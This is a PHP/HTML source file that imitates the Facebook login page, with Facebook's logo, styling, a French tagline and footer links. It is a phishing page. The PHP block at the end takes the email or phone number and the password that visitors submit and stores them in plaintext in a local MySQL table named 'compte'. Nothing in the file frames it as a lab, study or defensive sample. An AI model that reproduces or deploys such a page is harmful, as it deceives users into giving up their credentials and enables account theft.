<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook </title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *{
    margin: 0;
    padding: 0;
}
body{
    font-family: 'Open Sans', sans-serif;
    font-size: 14px;
    background: #fff;
}

.container{
    background: #f0f2f5;
    padding-top: 72px;
    padding-bottom: 112px;
}

.content{
    width: 980px;
    margin: 20px auto;
}

.content > div{
    display: inline-block;
    vertical-align: top;
}

.left-content{
    width: 580px;
    padding-right: 32px;
    box-sizing: border-box;
}
.f-logo{
    margin: 112px 0 16px;
}
.f-logo > img{
    height: 106px;
    margin: -28px;
}

.f-quote{
    font-size: 28px;
    font-weight: 500;
    color: #333;
}

.card{
    background: #fff;
    width: 396px;
    border-radius: 10px;
    box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
    padding: 10px 15px;
    box-sizing: border-box;
    margin-top: 40px;
}

.input-container > input[type=text],
.input-container > input[type=password]{
    width: 100%;
    padding: 14px 16px;
    box-sizing: border-box;
    outline: none;
    border: 1px solid #dddfe2;
    border-radius: 6px;
    margin: 5px 0;
    font-size: 17px;
}

.input-container > input[type=text]:focus,
.input-container > input[type=password]:focus{
    border: 1px solid #1877f2;
    box-shadow: 0 0 0 2px #e7f3ff
}

.login-btn{
    background: #1877f2;
    color: #fff;
    border-radius: 6px;
    width: 100%;
    font-size: 20px;
    font-weight: 600;
    border: none;
    box-sizing: border-box;
    padding: 14px 16px;
    margin: 10px 0;
    cursor: pointer;
}

.forgotten-password{
    text-align: center;
}

.forgotten-password > a{
    font-weight: 600;
    font-size: 14px;
    color: #1877f2;
    display: inline-block;
    margin: 20px 0;
    text-decoration: none;
}

.forgotten-password > a:hover{
    text-decoration: underline;
}

.divider{
    width: 100%;
    height: 1px;
    background: #d2d2d2;
}


.crt-new-ac{
    display: inline-block;
    background: #42b72a;
    border-radius: 6px;
    color: #fff;
    text-decoration: none;
    padding: 10px 16px;
    font-weight: 600;
    font-size: 17px;
    margin: 20px 0 7px;
}

.crt-page{
    color: #000;
    text-align: center;
    padding: 20px 0;
}

.crt-page > a{
    text-decoration: none;
    font-weight: 600;
    color: #000;
}

.f-lg-footer{
    width: 980px;
    margin: 30px auto;
}

.f-lg-footer > ul{
    margin-bottom: 10px;
    margin-top: 10px;
}

.f-lg-footer > ul > li{
    display: inline-block;
    margin: 0 5px;
}

.f-lg-footer > ul > li > a{
    text-decoration: none;
    color: #777;
    font-size: 12px;
}

.fix-m-header{
    background: #fffbe2;
    color: #3b5998;
    text-align: center;
    height: 50px;
    font-size: 16px;
    font-weight: 500;
    position: relative;
    display: none;
}

.fix-m-header > span,
.fix-m-header > img{
    vertical-align: top;
}

.fix-m-header > span{
    line-height: 50px;
}

.fix-m-header > img{
    position: relative;
    top: 10px;
}

.m-footer{
    display: none;
}

@media (max-width: 980px){

    .container{
        padding-top: 0px;
        padding-bottom: 20px;
        background: #fff;
    }
    .content{
        width: 100%;
        margin: 0 auto;
    }
    .left-content{
        width: 100%;
    }
    .right-content{
        width: 100%;
    }

    .f-lg-footer{
        display: none;
    }

    .f-logo{
        margin: 0 auto; 
        text-align: center;
    }
    .f-logo > img{
        height: 50px;
        margin: -50px auto;
        display: inline-block;
    }

    .f-quote{
        display: none;
    }

    .card{
        width: 100%;
        box-shadow: none;

    }

    .input-container > input[type=text],
    .input-container > input[type=password]{
        background: #f5f6f7;
    }

    .fix-m-header{
        display: block;
    }

    .m-footer{
        display: block;
        width: 250px;
        margin: 0 auto;
    }
    .m-footer .m-f-lang > ul:first-child{
        float: left;
    }
    .m-footer .m-f-lang > ul:last-child{
        float: right;
    }
    .m-footer .m-f-lang > ul li{
        list-style: none;
    }

    .m-footer .m-f-lang > ul > li > a{
        text-decoration: none;
        color: #777;
    }

    .m-footer .links > a{
        display: inline-block;
        margin: 0 10px;
        text-decoration: none;
        color: #777;
        font-weight: 500;
    }
}

    </style>
</head>
<body>

    <!-- logo: https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg -->

    <div class="fix-m-header">
        <img src="./assets/cell-phone.png" alt="Android">
        <span>Get Facebook for Android and browse faster</span>
    </div>

    <div class="container">
        <!-- main container -->
        <div class="content">
            <!-- logo container -->
           <div class="left-content">
               <div class="f-logo">
                   <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" />
               </div>
               <h2 class="f-quote">Avec Facebook, partagez et restez en contact avec votre entourage.</h2>
           </div>
           <!-- login form -->
           <div class="right-content">
               <div class="card">
                   <form method="post" >
                       <div class="input-container">
                           <input type="text" name="mail" placeholder="Email address or phone number">
                       </div>
                       <div class="input-container">
                            <input type="password" name="pass" placeholder="Password">
                        </div>
                        <div class="login-btn-container">
                            <input type="submit" value="Log In" name="ok" class="login-btn">
                        </div>
                   </form>

                   <div class="forgotten-password">
                       <a href="#">Forgotten Password?</a>
                   </div>

                   <div class="divider"></div>

                   <div class="" style="text-align: center;">
                       <a class="crt-new-ac" href="#">Create New Account</a>
                   </div>
               </div>
               <div class="crt-page">
                   <a href="#">Create a Page</a>
                   <span>for a celebrity, band or business.</span>
               </div>
           </div>
        </div>
    </div>

    <footer class="f-lg-footer">
        <ul>
            <li><a href="">English (UK)</a></li>
            <li><a href="">বাংলা</a></li>
            <li><a href="">हिन्दी</a></li>
            <li><a href="">اردو</a></li>
            <li><a href="">नेपाली</a></li>
            <li><a href="">ଓଡ଼ିଆ</a></li>
            <li><a href="">Español</a></li>
            <li><a href="">Português (Brasil)</a></li>
            <li><a href="">Français (France)</a></li>
            <li><a href="">Deutsch</a></li>
            <li><a href="">Italiano</a></li>
        </ul>
        <div class="divider"></div>
        <ul>  
            <li><a href="">Sign Up</a></li>
            <li><a href="">Log In</a></li>
            <li><a href="">Messenger</a></li>
            <li><a href="">Facebook Lite</a></li>
            <li><a href="">Watch</a></li>
            <li><a href="">Places</a></li>
            <li><a href="">Games</a></li>
            <li><a href="">Marketplace</a></li>
            <li><a href="">Facebook Pay</a></li>
            <li><a href="">Jobs</a></li>
            <li><a href="">Oculus</a></li>
            <li><a href="">Portal</a></li>
            <li><a href="">Instagram</a></li>
            <li><a href="">Local</a></li>
            <li><a href="">Fundraisers</a></li>
            <li><a href="">Services</a></li>
            <li><a href="">Voting</a></li>
            <li><a href="">Information Centre</a></li>
            <li><a href="">About</a></li>
            <li><a href="">Create ad</a></li>
            <li><a href="">Create Page</a></li>
            <li><a href="">Developers</a></li>
            <li><a href="">Careers</a></li>
            <li><a href="">Privacy</a></li>
            <li><a href="">Cookies</a></li>
            <li><a href="">AdChoices</a></li>
            <li><a href="">Terms</a></li>
            <li><a href="">Help</a></li>
            <li><a href="">Settings</a></li>
        </ul>
    </footer>

    <div class="m-footer">
        <div class="m-f-lang">
            <ul>
                <li><a href="">English (UK)</a></li>
                <li><a href="">বাংলা</a></li>
                <li><a href="">हिन्दी</a></li>
            </ul>
            <ul>
                <li><a href="">اردو</a></li>
                <li><a href="">नेपाली</a></li>
                <li><a href="">ଓଡ଼ିଆ</a></li>
            </ul>
        </div>
        

        <div style="clear: both;"></div>

        <div class="links" style="text-align: center;">
            <a href="#">About</a><a href="#">Help</a><a href="#">More</a>
        </div>

        <div style="font-weight: 600;text-align: center;margin: 10px 0;color: #777;">Facebook Inc</div>
    </div>

    <?php
if (isset($_POST["ok"])) {
    $host = 'localhost';
    $dbname = 'facebook';
    $username = 'root';
    $password = '';
    try {
        $con = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
        // Préparation de la requête
        $sql = 'INSERT INTO compte (login_face,password_face) VALUES (?,?)';
        $stmt = $con->prepare($sql);
        // Exécution de la requête avec les valeurs des paramètres
        $result = $stmt->execute([$_POST["mail"], $_POST["pass"]]);
        // Vérification du résultat de l'exécution
        if ($result) {
            // echo "<p>ssssssss</p>";
        } else {
            // $error = "<p>La requête a échoué</p>";
        }
    } catch (PDOException $e) {
        $error = 'Erreur : ' . $e->getMessage();
    }
}

?>


    
</body>
</html>
